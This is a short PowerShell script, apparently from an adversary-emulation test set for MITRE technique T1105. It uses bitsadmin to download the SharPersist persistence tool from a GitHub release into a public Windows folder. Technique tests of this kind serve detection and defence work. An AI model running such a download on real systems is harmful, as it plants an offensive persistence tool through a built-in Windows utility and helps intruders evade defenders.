# Donwload SharPersist using Bitsadmin
# Technic ID : T1105
Clear-Host
Write-Output "==============================================================================="
Write-Output "Donwload SharPersist using Bitsadmin (T1105)"
Write-Output "==============================================================================="
#
bitsadmin  /transfer DonwloadJob /download /priority normal https://github.com/mandiant/SharPersist/releases/download/v1.0.1/SharPersist.exe $env:PUBLIC\Toolz\SharPersist.exe